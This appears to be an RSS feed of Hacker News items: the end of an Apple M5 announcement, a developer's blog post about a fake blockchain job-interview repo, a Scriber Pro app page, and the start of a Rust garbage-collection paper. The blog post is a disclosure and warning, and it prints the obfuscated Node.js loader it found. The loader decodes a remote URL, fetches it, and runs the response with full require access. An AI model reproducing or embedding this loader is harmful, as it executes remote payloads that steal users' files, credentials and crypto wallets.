        <div>The Neural Engine in M5 also enhances performance for Apple Intelligence.<sup>3</sup> On-device AI tools like Image Playground get faster, and the overall performance of Apple Intelligence models are enhanced by the faster Neural Engine and unified memory in M5.<sup>4</sup> Also, developers using Apple’s Foundation Models framework will get faster performance.
</div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, Apple Intelligence-powered Writing Tools are shown on Mac.">
        <div>
             
              
              <div>
                The higher unified memory and faster Neural Engine supercharge Apple Intelligence, allowing users to experience powerful AI tools right on device.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/article/Apple-M5-Writing-Tools-251015.zip" download="" data-analytics-title="download image - Apple-M5-Writing-Tools-251015_big" aria-label="Download media, Apple Intelligence-powered Writing Tools are shown on Mac."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Enhanced Memory to Do Even More with AI</strong>
</h2>
                 
             
                 <div>M5 offers unified memory bandwidth of 153GB/s, providing a nearly 30 percent increase over M4 and more than 2x over M1. The unified memory architecture enables the entire chip to access a large single pool of memory, which allows MacBook Pro, iPad Pro, and Apple Vision Pro to run larger AI models completely on device. It fuels the faster CPU, GPU, and Neural Engine as well, offering higher multithreaded performance in apps, faster graphics performance in creative apps and games, and faster AI performance running models on the Neural Accelerators in the GPU or the Neural Engine. And with 32GB of memory capacity, M5 also helps users to seamlessly run demanding creative suites like Adobe Photoshop and Final Cut Pro simultaneously, while uploading large files to the cloud in the background.
</div>
                 
             
                 <h2><strong>Apple Silicon and the Environment</strong>
</h2>
                 
             
                 <div>Apple 2030 is the company’s ambitious plan to be carbon neutral across its entire footprint by the end of this decade by reducing product emissions from their three biggest sources: materials, electricity, and transportation. The power-efficient performance of M5 helps the new 14-inch MacBook Pro, iPad Pro, and Apple Vision Pro meet Apple’s high standards for energy efficiency, and reduces the total amount of energy consumed over the product’s lifetime.
</div>
                 
             
         </div>
 

    
    
    




    
    
        
    


    
    
    



    
    
    




    




    
    
    





    
    
    <div>
            <ol>
<li>Testing conducted by Apple in September 2025 using preproduction 14-inch MacBook Pro systems with Apple M5, 10-core CPU, and 10-core GPU; production 14-inch MacBook Pro systems with Apple M4, 10-core CPU, and 10-core GPU; and production 13-inch MacBook Pro systems with Apple M1, 8-core CPU, and 8-core GPU. Performance measured using select industry‑standard benchmarks. Performance tests are conducted using specific computer systems and reflect the approximate performance of MacBook Pro.</li>
<li>Testing conducted by Apple in September 2025 using shipping competitive systems and select industry-standard benchmarks.</li>
<li>Apple Intelligence is available in beta with support for these languages: English, French, German, Italian, Portuguese (Brazil), Spanish, Chinese (simplified), Japanese, and Korean. Some features may not be available in all regions or languages. For feature and language availability and system requirements, see&nbsp;<a href="https://support.apple.com/en-us/121115" target="_blank">support.apple.com/en-us/121115</a>.</li>
<li>Genmoji and Image Playground are available in English, French, German, Italian, Portuguese (Brazil), Spanish, and Japanese.</li>
</ol>

        </div>



    
    
    






    















	

		
		
			
























		
		

</article>



</section>
</main>



<div>
            Stay up to date with the latest articles from Apple Newsroom.
        </div>
	

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[I almost got hacked by a 'job interview' (718 pts)]]></title>
            <link>https://blog.daviddodda.com/how-i-almost-got-hacked-by-a-job-interview</link>
            <guid>45591707</guid>
            <pubDate>Wed, 15 Oct 2025 12:56:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.daviddodda.com/how-i-almost-got-hacked-by-a-job-interview">https://blog.daviddodda.com/how-i-almost-got-hacked-by-a-job-interview</a>, See on <a href="https://news.ycombinator.com/item?id=45591707">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-content-parent"><p>I was 30 seconds away from running malware on my machine.</p>
<p>The attack vector? A fake coding interview from a "legitimate" blockchain company.</p>
<p>Here's how a sophisticated scam operation almost got me, and why every developer needs to read this.</p>
<h2 id="heading-the-setup">The Setup</h2>
<p>Last week, I got a LinkedIn message from Mykola Yanchii. Chief Blockchain Officer at Symfa. Real company. Real LinkedIn profile. 1,000+ connections. The works.</p>
<p>The message was smooth. Professional. "We're developing BestCity, a platform aimed at transforming real estate workflows. Part-time roles available. Flexible structure."</p>
<p>I've been freelancing for 8 years. Built web applications, worked on various projects, done my share of code reviews. I'm usually paranoid about security - or so I thought.</p>
<p>This looked legit. So I said yes to the call.</p>
<h2 id="heading-the-hook">The Hook</h2>
<p>Before our meeting, Mykola sent me a "test project" - standard practice for tech interviews. A React/Node codebase to evaluate my skills. 30-minute test. Simple enough.</p>
<p>The Bitbucket repo looked professional. Clean README. Proper documentation. Even had that corporate stock photo of a woman with a tablet standing in front of a house. You know the one.</p>
<p>Here's where I almost screwed up: I was running late for our call. Had about 30 minutes to review the code. So I did what lazy developers do - I started poking around the codebase without running it first.</p>
<p>Usually, I sandbox everything. Docker containers. Isolated environments. But I was in a rush.</p>
<p>I spent 30 minutes fixing obvious bugs, adding a docker-compose file, cleaning up the code. Standard stuff. Ready to run it and show my work.</p>
<p>Then I had one of those paranoid developer moments.</p>
<h2 id="heading-the-save">The Save</h2>
<p>Before hitting <code>npm start</code>, I threw this prompt at my Cursor AI agent:</p>
<p>"Before I run this application, can you see if there are any suspicious code in this codebase? Like reading files it shouldn't be reading, accessing crypto wallets etc."</p>
<p>And holy sh*t.</p>
<p>Sitting right in the middle of <code>server/controllers/userController.js</code> was this beauty:</p>
<pre><code><span>//Get Cookie  </span>
(<span>async</span> () =&gt; {  
    <span>const</span> byteArray = [  
        <span>104</span>, <span>116</span>, <span>116</span>, <span>112</span>, <span>115</span>, <span>58</span>, <span>47</span>, <span>47</span>, <span>97</span>, <span>112</span>, <span>105</span>, <span>46</span>, <span>110</span>, <span>112</span>, <span>111</span>, <span>105</span>,  
        <span>110</span>, <span>116</span>, <span>46</span>, <span>105</span>, <span>111</span>, <span>47</span>, <span>50</span>, <span>99</span>, <span>52</span>, <span>53</span>, <span>56</span>, <span>54</span>, <span>49</span>, <span>50</span>, <span>51</span>, <span>57</span>, <span>99</span>, <span>51</span>,  
        <span>98</span>, <span>50</span>, <span>48</span>, <span>51</span>, <span>49</span>, <span>102</span>, <span>98</span>, <span>57</span>  
    ];  
    <span>const</span> uint8Array = <span>new</span> <span>Uint8Array</span>(byteArray);  
    <span>const</span> decoder = <span>new</span> TextDecoder(<span>'utf-8'</span>);  
    axios.get(decoder.decode(uint8Array))  
        .then(<span><span>response</span> =&gt;</span> {  
            <span>new</span> <span>Function</span>(<span>"require"</span>, response.data.model)(<span>require</span>);  
        })  
        .catch(<span><span>error</span> =&gt;</span> { });  
})();
</code></pre>
<p>Obfuscated. Sneaky. Evil. And 100% active - embedded between legitimate admin functions, ready to execute with full server privileges the moment admin routes were accessed.</p>
<p>I decoded that byte array: <code>https://api.npoint.io/2c458612399c3b2031fb9</code></p>
<p>When I first hit the URL, it was live. I grabbed the payload. Pure malware. The kind that steals everything - crypto wallets, files, passwords, your entire digital existence.</p>
<p>Here's the kicker: the URL died exactly 24 hours later. These guys weren't messing around - they had their infrastructure set up to burn evidence fast.</p>
<p>I ran the payload through VirusTotal - <a target="_blank" href="https://www.virustotal.com/gui/file/e2da104303a4e7f3bbdab6f1839f80593cdc8b6c9296648138bd2ee3cf7912d5/behavior">check out the behavior analysis yourself</a>. Spoiler alert: it's nasty.</p>
<h2 id="heading-the-operation">The Operation</h2>
<p>This wasn't some amateur hour scam. This was sophisticated:</p>
<p><strong>The LinkedIn Profile</strong>: Mykola Yanchii looked 100% real. Chief Blockchain Officer. Proper work history. Even had those cringy LinkedIn posts about "innovation" and "blockchain consulting."</p>
<p><strong>The Company</strong>: Symfa had a full LinkedIn company page. Professional branding. Multiple employees. Posts about "transforming real estate with blockchain." They even had affiliated pages and follower networks.</p>
<p><strong>The Approach</strong>: No red flags in the initial outreach. Professional language. Reasonable project scope. They even used Calendly for scheduling.</p>
<p><strong>The Payload</strong>: The malicious code was positioned strategically in the server-side controller, ready to execute with full Node.js privileges when admin functionality was accessed.</p>
<h2 id="heading-the-psychology">The Psychology</h2>
<p>Here's what made this so dangerous:</p>
<p><strong>Urgency</strong>: "Complete the test before the meeting to save time."</p>
<p><strong>Authority</strong>: LinkedIn verified profile, real company, professional setup.</p>
<p><strong>Familiarity</strong>: Standard take-home coding test. Every developer has done dozens of these.</p>
<p><strong>Social Proof</strong>: Real company page with real employees and real connections.</p>
<p>I almost fell for it. And I'm paranoid about this stuff.</p>
<h2 id="heading-the-lesson">The Lesson</h2>
<p>One simple AI prompt saved me from disaster.</p>
<p>Not fancy security tools. Not expensive antivirus software. Just asking my coding assistant to look for suspicious patterns before executing unknown code.</p>
<p>The scary part? This attack vector is perfect for developers. We download and run code all day long. GitHub repos, npm packages, coding challenges. Most of us don't sandbox every single thing.</p>
<p>And this was server-side malware. Full Node.js privileges. Access to environment variables, database connections, file systems, crypto wallets. Everything.</p>
<h2 id="heading-the-scale">The Scale</h2>
<p>If this sophisticated operation is targeting developers at scale, how many have already been compromised? How many production systems are they inside right now?</p>
<p><strong>Perfect Targeting</strong>: Developers are ideal victims. Our machines contain the keys to the kingdom: production credentials, crypto wallets, client data.</p>
<p><strong>Professional Camouflage</strong>: LinkedIn legitimacy, realistic codebases, standard interview processes.</p>
<p><strong>Technical Sophistication</strong>: Multi-layer obfuscation, remote payload delivery, dead-man switches, server-side execution.</p>
<p>One successful infection could compromise production systems at major companies, crypto holdings worth millions, personal data of thousands of users.</p>
<h2 id="heading-the-bottom-line">The Bottom Line</h2>
<p>If you're a developer getting LinkedIn job opportunities:</p>
<ol>
<li><p><strong>Always sandbox unknown code</strong>. Docker containers, VMs, whatever. Never run it on your main machine.</p>
</li>
<li><p><strong>Use AI to scan for suspicious patterns</strong>. Takes 30 seconds. Could save your entire digital life.</p>
</li>
<li><p><strong>Verify everything</strong>. Real LinkedIn profile doesn't mean real person. Real company doesn't mean real opportunity.</p>
</li>
<li><p><strong>Trust your gut</strong>. If someone's rushing you to execute code, that's a red flag.</p>
</li>
</ol>
<p>This scam was so sophisticated it fooled my initial BS detector. But one paranoid moment and a simple AI prompt exposed the whole thing.</p>
<p>The next time someone sends you a "coding challenge," remember this story.</p>
<p>Your crypto wallet will thank you.</p>
<hr>
<p><em>If you're a developer who has run "coding challenges" from LinkedIn recruiters, you should probably read this twice.</em></p>
<h4 id="heading-the-linkedin-profiles">the LinkedIn profiles</h4>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1757745582878/7d89d814-b484-49ed-bb94-d80f6c9a4e0b.png?auto=compress,format&amp;format=webp" alt=""></p>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1757745591986/8c6823b4-dd93-4958-9aaf-f50bbf321feb.png?auto=compress,format&amp;format=webp" alt=""></p>
<h4 id="heading-messages">Messages</h4>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1757745654452/aed5f0d5-0eaa-4670-a711-575163411278.png?auto=compress,format&amp;format=webp" alt=""></p>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1757745670595/ced99dd5-dd32-4007-9b0d-ac6aac757ad2.png?auto=compress,format&amp;format=webp" alt=""></p>
<h4 id="heading-bit-bucket">bit bucket</h4>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1757745718655/522da775-a762-4516-9c99-6b26487407a0.png?auto=compress,format&amp;format=webp" alt=""></p>
<p><a target="_blank" href="https://bitbucket.org/0x3bestcity/test_version/src/main/">https://bitbucket.org/0x3bestcity/test_version/src/main/</a> - not sure how long this will stay up though.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Scriber Pro – Offline AI transcription for macOS (120 pts)]]></title>
            <link>https://scriberpro.cc/hn/</link>
            <guid>45591222</guid>
            <pubDate>Wed, 15 Oct 2025 12:16:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://scriberpro.cc/hn/">https://scriberpro.cc/hn/</a>, See on <a href="https://news.ycombinator.com/item?id=45591222">Hacker News</a></p>
<div id="readability-page-1" class="page"><section aria-label="Scriber Pro HN">  <p>
Offline AI transcription for macOS
</p> <p>
• 4.5hr video → 3.5min. Faster than Rev, Otter, or any online service.<br>
• More accurate on long context. No 2-hour upload limits.<br>
• 100% offline. Your data never leaves your Mac.
</p> <!-- Demo video --> <video autoplay="" loop="" muted="" playsinline="" poster="https://scriberpro.cc/og-image.png"> <source src="https://scriberpro.cc/ScriberPro.mp4" type="video/mp4"> </video> <!-- Promo code claim button -->  <h2>Why Scriber Pro?</h2> <ul> <li><strong>Stupid fast:</strong> 4.5hr video → 3.5min. Seriously.</li> <li><strong>Any format:</strong> MP3, WAV, MP4, MOV, M4A, FLAC—drop it in, it works.</li> <li><strong>Perfect timecodes:</strong> 5min or 5hr file, timecodes stay accurate. No drift, no chunking errors.</li> <li><strong>Works offline:</strong> On a plane. In a coffee shop. No internet, no problem.</li> <li><strong>Your data stays yours:</strong> Everything processes on your Mac. No cloud uploads, no surveillance.</li> </ul> <h2>Export Anywhere</h2> <div> <p><strong>Timecode formats:</strong> SRT, VTT, JSON (with precise timestamps)<br> <strong>Documents:</strong> PDF, DOCX, TXT, Markdown<br> <strong>Data:</strong> CSV, JSON</p><p> 
One transcription, eight formats. Perfect timecodes whether it's 3min or 3hr.
</p></div> <!-- App Store download button --> <a href="https://apps.apple.com/us/app/scriber-pro/id6751968220?mt=12&amp;itscg=30200&amp;itsct=apps_box_link&amp;mttnsubad=6751968220" target="_blank" rel="noopener noreferrer"> <svg xmlns="http://www.w3.org/2000/svg" width="156.10054" height="40" viewBox="0 0 156.10054 40"> <title>Download_on_the_Mac_App_Store_Badge_US-UK_RGB_blk_092917</title> <g> <g> <g> <path d="M146.57123,0H9.53468c-.3667,0-.729,0-1.09473.002-.30615.002-.60986.00781-.91895.0127A13.21476,13.21476,0,0,0,5.5171.19141a6.66509,6.66509,0,0,0-1.90088.627A6.4378,6.4378,0,0,0,1.99757,1.99707,6.25844,6.25844,0,0,0,.81935,3.61816a6.60119,6.60119,0,0,0-.625,1.90332,12.993,12.993,0,0,0-.1792,2.002C.00587,7.83008.00489,8.1377,0,8.44434V31.5586c.00489.3105.00587.6113.01514.9219a12.99232,12.99232,0,0,0,.1792,2.0019,6.58756,6.58756,0,0,0,.625,1.9043A6.20778,6.20778,0,0,0,1.99757,38.001a6.27446,6.27446,0,0,0,1.61865,1.1787,6.70082,6.70082,0,0,0,1.90088.6308,13.45514,13.45514,0,0,0,2.0039.1768c.30909.0068.6128.0107.91895.0107C8.80567,40,9.168,40,9.53468,40H146.57123c.3594,0,.7246,0,1.084-.002.3047,0,.6172-.0039.9219-.0107a13.279,13.279,0,0,0,2-.1768,6.80432,6.80432,0,0,0,1.9082-.6308,6.27742,6.27742,0,0,0,1.6172-1.1787,6.39482,6.39482,0,0,0,1.1816-1.6143,6.60413,6.60413,0,0,0,.6191-1.9043,13.50643,13.50643,0,0,0,.1856-2.0019c.0039-.3106.0039-.6114.0039-.9219.0078-.3633.0078-.7246.0078-1.0938V9.53613c0-.36621,0-.72949-.0078-1.09179,0-.30664,0-.61426-.0039-.9209a13.5071,13.5071,0,0,0-.1856-2.002,6.6177,6.6177,0,0,0-.6191-1.90332,6.46619,6.46619,0,0,0-2.7988-2.7998,6.76754,6.76754,0,0,0-1.9082-.627,13.04394,13.04394,0,0,0-2-.17676c-.3047-.00488-.6172-.01074-.9219-.01269-.3594-.002-.7246-.002-1.084-.002Z" style="fill: #a6a6a6"></path> <path d="M8.44483,39.125c-.30468,0-.60205-.0039-.90429-.0107a12.68714,12.68714,0,0,1-1.86914-.1631,5.88381,5.88381,0,0,1-1.65674-.5479,5.40573,5.40573,0,0,1-1.397-1.0166,5.32082,5.32082,0,0,1-1.02051-1.3965,5.72184,5.72184,0,0,1-.543-1.6572,12.41339,12.41339,0,0,1-.1665-1.875c-.00634-.2109-.01464-.9131-.01464-.9131V8.44434S.88185,7.75293.8877,7.5498a12.37032,12.37032,0,0,1,.16553-1.87207,5.75552,5.75552,0,0,1,.54346-1.6621A5.3735,5.3735,0,0,1,2.61183,2.61768,5.56543,5.56543,0,0,1,4.01417,1.59521a5.82309,5.82309,0,0,1,1.65332-.54394A12.58589,12.58589,0,0,1,7.543.88721L8.44532.875h139.205l.9131.0127a12.38493,12.38493,0,0,1,1.8584.16259,5.93833,5.93833,0,0,1,1.6709.54785,5.59374,5.59374,0,0,1,2.415,2.41993,5.76267,5.76267,0,0,1,.5352,1.64892,12.995,12.995,0,0,1,.1738,1.88721c.0029.2832.0029.5874.0029.89014.0079.375.0079.73193.0079,1.09179V30.4648c0,.3633,0,.7178-.0079,1.0752,0,.3252,0,.6231-.0039.9297a12.73127,12.73127,0,0,1-.1709,1.8535,5.739,5.739,0,0,1-.54,1.67,5.48029,5.48029,0,0,1-1.0156,1.3857,5.4129,5.4129,0,0,1-1.3994,1.0225,5.86168,5.86168,0,0,1-1.668.5498,12.54218,12.54218,0,0,1-1.8692.1631c-.2929.0068-.5996.0107-.8974.0107l-1.084.002Z"></path> </g> <g id="_Group_" data-name="<Group>"> <g id="_Group_2" data-name="<Group>"> <g id="_Group_3" data-name="<Group>"> <g id="_Group_4" data-name="<Group>"> <path id="_Path_" data-name="<Path>" d="M24.76888,20.30068a4.94881,4.94881,0,0,1,2.35656-4.15206,5.06566,5.06566,0,0,0-3.99116-2.15768c-1.67924-.17626-3.30719,1.00483-4.1629,1.00483-.87227,0-2.18977-.98733-3.6085-.95814a5.31529,5.31529,0,0,0-4.47292,2.72787c-1.934,3.34842-.49141,8.26947,1.3612,10.97608.9269,1.32535,2.01018,2.8058,3.42763,2.7533,1.38706-.05753,1.9051-.88448,3.5794-.88448,1.65876,0,2.14479.88448,3.591.8511,1.48838-.02416,2.42613-1.33124,3.32051-2.66914a10.962,10.962,0,0,0,1.51842-3.09251A4.78205,4.78205,0,0,1,24.76888,20.30068Z" style="fill: #fff"></path> <path id="_Path_2" data-name="<Path>" d="M22.03725,12.21089a4.87248,4.87248,0,0,0,1.11452-3.49062,4.95746,4.95746,0,0,0-3.20758,1.65961,4.63634,4.63634,0,0,0-1.14371,3.36139A4.09905,4.09905,0,0,0,22.03725,12.21089Z" style="fill: #fff"></path> </g> </g> <g> <path d="M46.14895,30.49609V21.35645H46.0884l-3.74316,9.04492H40.91652l-3.75293-9.04492H37.104v9.13965H35.34816v-12.418h2.22949l4.01855,9.80176h.06836l4.01074-9.80176h2.2373v12.418Z" style="fill: #fff"></path> <path d="M49.396,27.92285c0-1.583,1.21289-2.53906,3.36523-2.668l2.47852-.1377v-.68848c0-1.00684-.66309-1.5752-1.791-1.5752a1.73035,1.73035,0,0,0-1.90137,1.27441H49.8091c.05176-1.63574,1.5752-2.79687,3.69141-2.79687,2.16016,0,3.58887,1.17871,3.58887,2.96v6.20508H55.30813V29.00684h-.043a3.23683,3.23683,0,0,1-2.85742,1.64453A2.74447,2.74447,0,0,1,49.396,27.92285Zm5.84375-.81738V26.4082l-2.22949.1377c-1.11035.06934-1.73828.55078-1.73828,1.3252,0,.792.6543,1.30859,1.65234,1.30859A2.17046,2.17046,0,0,0,55.23977,27.10547Z" style="fill: #fff"></path> <path d="M64.89309,24.55762a1.99909,1.99909,0,0,0-2.13379-1.66895c-1.42871,0-2.375,1.19629-2.375,3.08105,0,1.92773.95508,3.08887,2.3916,3.08887a1.94829,1.94829,0,0,0,2.11719-1.626h1.79A3.61835,3.61835,0,0,1,62.7593,30.6084c-2.582,0-4.26855-1.76465-4.26855-4.63867,0-2.81445,1.68652-4.63867,4.251-4.63867a3.63931,3.63931,0,0,1,3.9248,3.22656Z" style="fill: #fff"></path> <path d="M78.7593,27.13965H74.0259l-1.13672,3.35645H70.8843l4.4834-12.418h2.083l4.4834,12.418H79.895Zm-4.24316-1.54883h3.752l-1.84961-5.44727h-.05176Z" style="fill: #fff"></path> <path d="M91.61672,25.96973c0,2.81348-1.50586,4.62109-3.77832,4.62109a3.0693,3.0693,0,0,1-2.84863-1.584h-.043v4.48438H83.0884V21.44238h1.79883v1.50586h.03418a3.21161,3.21161,0,0,1,2.88281-1.60059C90.10207,21.34766,91.61672,23.16406,91.61672,25.96973Zm-1.91016,0c0-1.833-.94727-3.03809-2.39258-3.03809-1.41992,0-2.375,1.23047-2.375,3.03809,0,1.82422.95508,3.0459,2.375,3.0459C88.7593,29.01563,89.70656,27.81934,89.70656,25.96973Z" style="fill: #fff"></path> <path d="M101.58156,25.96973c0,2.81348-1.50586,4.62109-3.77832,4.62109a3.0693,3.0693,0,0,1-2.84863-1.584h-.043v4.48438h-1.8584V21.44238h1.79883v1.50586h.03418a3.21162,3.21162,0,0,1,2.88281-1.60059C100.06691,21.34766,101.58156,23.16406,101.58156,25.96973Zm-1.91016,0c0-1.833-.94727-3.03809-2.39258-3.03809-1.41992,0-2.375,1.23047-2.375,3.03809,0,1.82422.95508,3.0459,2.375,3.0459C98.72414,29.01563,99.67141,27.81934,99.67141,25.96973Z" style="fill: #fff"></path> <path d="M108.1675,27.03613c.1377,1.23145,1.334,2.04,2.96875,2.04,1.56641,0,2.69336-.80859,2.69336-1.91895,0-.96387-.67969-1.541-2.28906-1.93652l-1.60937-.3877c-2.28027-.55078-3.33887-1.61719-3.33887-3.34766,0-2.14258,1.86719-3.61426,4.51855-3.61426,2.624,0,4.42285,1.47168,4.4834,3.61426h-1.876c-.1123-1.23926-1.13672-1.9873-2.63379-1.9873s-2.52149.75684-2.52149,1.8584c0,.87793.65431,1.39453,2.25489,1.79l1.36816.33594c2.54785.60254,3.60645,1.626,3.60645,3.44238,0,2.32324-1.85059,3.77832-4.79395,3.77832-2.75391,0-4.61328-1.4209-4.7334-3.667Z" style="fill: #fff"></path> <path d="M119.80324,19.2998v2.14258h1.72168v1.47168h-1.72168v4.99121c0,.77539.34473,1.13672,1.10156,1.13672a5.80752,5.80752,0,0,0,.61133-.043v1.46289a5.10351,5.10351,0,0,1-1.03223.08594c-1.833,0-2.54785-.68848-2.54785-2.44434V22.91406h-1.31641V21.44238h1.31641V19.2998Z" style="fill: #fff"></path> <path d="M122.521,25.96973c0-2.84863,1.67773-4.63867,4.29395-4.63867,2.625,0,4.29492,1.79,4.29492,4.63867,0,2.85645-1.66113,4.63867-4.29492,4.63867C124.18215,30.6084,122.521,28.82617,122.521,25.96973Zm6.69531,0c0-1.9541-.89551-3.10742-2.40137-3.10742s-2.40137,1.16211-2.40137,3.10742c0,1.96191.89551,3.10645,2.40137,3.10645S129.21633,27.93164,129.21633,25.96973Z" style="fill: #fff"></path> <path d="M132.64309,21.44238h1.77246v1.541h.043a2.1594,2.1594,0,0,1,2.17773-1.63574,2.86616,2.86616,0,0,1,.63672.06934v1.73828a2.598,2.598,0,0,0-.835-.1123,1.87264,1.87264,0,0,0-1.93651,2.083v5.37012h-1.8584Z" style="fill: #fff"></path> <path d="M145.84035,27.83691c-.25,1.64355-1.85059,2.77148-3.89844,2.77148-2.63379,0-4.26855-1.76465-4.26855-4.5957,0-2.83984,1.64355-4.68164,4.19043-4.68164,2.50488,0,4.08008,1.7207,4.08008,4.46582v.63672h-6.39453v.1123a2.358,2.358,0,0,0,2.43555,2.56445,2.04834,2.04834,0,0,0,2.09082-1.27344Zm-6.28223-2.70215h4.52637a2.1773,2.1773,0,0,0-2.2207-2.29785A2.292,2.292,0,0,0,139.55813,25.13477Z" style="fill: #fff"></path> </g> </g> </g> </g> <g id="_Group_5" data-name="<Group>"> <g> <path d="M37.82619,8.731a2.63964,2.63964,0,0,1,2.80762,2.96484c0,1.90625-1.03027,3.002-2.80762,3.002H35.67092V8.731Zm-1.22852,5.123h1.125a1.87588,1.87588,0,0,0,1.96777-2.146,1.881,1.881,0,0,0-1.96777-2.13379h-1.125Z" style="fill: #fff"></path> <path d="M41.68068,12.44434a2.13323,2.13323,0,1,1,4.24707,0,2.13358,2.13358,0,1,1-4.24707,0Zm3.333,0c0-.97607-.43848-1.54687-1.208-1.54687-.77246,0-1.207.5708-1.207,1.54688,0,.98389.43457,1.55029,1.207,1.55029C44.57521,13.99463,45.01369,13.42432,45.01369,12.44434Z" style="fill: #fff"></path> <path d="M51.57326,14.69775h-.92187l-.93066-3.31641h-.07031l-.92676,3.31641h-.91309l-1.24121-4.50293h.90137l.80664,3.436h.06641l.92578-3.436h.85254l.92578,3.436h.07031l.80273-3.436h.88867Z" style="fill: #fff"></path> <path d="M53.85354,10.19482H54.709v.71533h.06641a1.348,1.348,0,0,1,1.34375-.80225,1.46456,1.46456,0,0,1,1.55859,1.6748v2.915h-.88867V12.00586c0-.72363-.31445-1.0835-.97168-1.0835a1.03294,1.03294,0,0,0-1.0752,1.14111v2.63428h-.88867Z" style="fill: #fff"></path> <path d="M59.09377,8.437h.88867v6.26074h-.88867Z" style="fill: #fff"></path> <path d="M61.21779,12.44434a2.13323,2.13323,0,1,1,4.24707,0,2.13358,2.13358,0,1,1-4.24707,0Zm3.333,0c0-.97607-.43848-1.54687-1.208-1.54687-.77246,0-1.207.5708-1.207,1.54688,0,.98389.43457,1.55029,1.207,1.55029C64.11232,13.99463,64.5508,13.42432,64.5508,12.44434Z" style="fill: #fff"></path> <path d="M66.40041,13.42432c0-.81055.60352-1.27783,1.6748-1.34424l1.21973-.07031v-.38867c0-.47559-.31445-.74414-.92187-.74414-.49609,0-.83984.18213-.93848.50049h-.86035c.09082-.77344.81836-1.26953,1.83984-1.26953,1.12891,0,1.76563.562,1.76563,1.51318v3.07666h-.85547v-.63281h-.07031a1.515,1.515,0,0,1-1.35254.707A1.36026,1.36026,0,0,1,66.40041,13.42432Zm2.89453-.38477v-.37646l-1.09961.07031c-.62012.0415-.90137.25244-.90137.64941,0,.40527.35156.64111.835.64111A1.0615,1.0615,0,0,0,69.29494,13.03955Z" style="fill: #fff"></path> <path d="M71.34768,12.44434c0-1.42285.73145-2.32422,1.86914-2.32422a1.484,1.484,0,0,1,1.38086.79h.06641V8.437h.88867v6.26074h-.85156v-.71143h-.07031a1.56284,1.56284,0,0,1-1.41406.78564C72.07131,14.772,71.34768,13.87061,71.34768,12.44434Zm.918,0c0,.95508.4502,1.52979,1.20313,1.52979.749,0,1.21191-.583,1.21191-1.52588,0-.93848-.46777-1.52979-1.21191-1.52979C72.72072,10.91846,72.26564,11.49707,72.26564,12.44434Z" style="fill: #fff"></path> <path d="M79.22951,12.44434a2.13346,2.13346,0,1,1,4.24756,0,2.1338,2.1338,0,1,1-4.24756,0Zm3.333,0c0-.97607-.43848-1.54687-1.208-1.54687-.77246,0-1.207.5708-1.207,1.54688,0,.98389.43457,1.55029,1.207,1.55029C82.124,13.99463,82.56252,13.42432,82.56252,12.44434Z" style="fill: #fff"></path> <path d="M84.66945,10.19482h.85547v.71533h.06641a1.348,1.348,0,0,1,1.34375-.80225,1.46456,1.46456,0,0,1,1.55859,1.6748v2.915H87.605V12.00586c0-.72363-.31445-1.0835-.97168-1.0835a1.03294,1.03294,0,0,0-1.0752,1.14111v2.63428h-.88867Z" style="fill: #fff"></path> <path d="M93.51516,9.07373v1.1416h.97559v.74854h-.97559V13.2793c0,.47168.19434.67822.63672.67822a2.96657,2.96657,0,0,0,.33887-.02051v.74023a2.9155,2.9155,0,0,1-.4834.04541c-.98828,0-1.38184-.34766-1.38184-1.21582v-2.543h-.71484v-.74854h.71484V9.07373Z" style="fill: #fff"></path> <path d="M95.70461,8.437h.88086v2.48145h.07031a1.3856,1.3856,0,0,1,1.373-.80664,1.48339,1.48339,0,0,1,1.55078,1.67871v2.90723H98.69v-2.688c0-.71924-.335-1.0835-.96289-1.0835a1.05194,1.05194,0,0,0-1.13379,1.1416v2.62988h-.88867Z" style="fill: #fff"></path> <path d="M104.76125,13.48193a1.828,1.828,0,0,1-1.95117,1.30273A2.04531,2.04531,0,0,1,100.73,12.46045a2.07685,2.07685,0,0,1,2.07617-2.35254c1.25293,0,2.00879.856,2.00879,2.27V12.688h-3.17969v.0498a1.1902,1.1902,0,0,0,1.19922,1.29,1.07934,1.07934,0,0,0,1.07129-.5459Zm-3.126-1.45117h2.27441a1.08647,1.08647,0,0,0-1.1084-1.1665A1.15162,1.15162,0,0,0,101.63527,12.03076Z" style="fill: #fff"></path> </g> </g> </g> </svg> </a> <p>
Contact: <a href="https://scriberpro.cc/cdn-cgi/l/email-protection" data-cfemail="97e4e2e7e7f8e5e3d7e4f4e5fef5f2e5e7e5f8b9f4f4">[email&nbsp;protected]</a> | <a href="https://scriberpro.cc/">Main Site</a> </p> </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Garbage collection for Rust: The finalizer frontier (109 pts)]]></title>
            <link>https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/</link>
            <guid>45591149</guid>
            <pubDate>Wed, 15 Oct 2025 12:08:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/">https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/</a>, See on <a href="https://news.ycombinator.com/item?id=45591149">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  
<p><strong>Abstract</strong> Rust is a non-Garbage Collected (GCed) language, but the lack of GC
makes expressing data-structures that require shared ownership awkward,
inefficient, or both. In this paper we explore a new design for, and
implementation of, GC in Rust, called <span>Alloy</span>. Unlike previous approaches to GC in
Rust, <span>Alloy</span> allows existing Rust
destructors to be automatically used as GC finalizers: this makes <span>Alloy</span> integrate better with existing Rust code
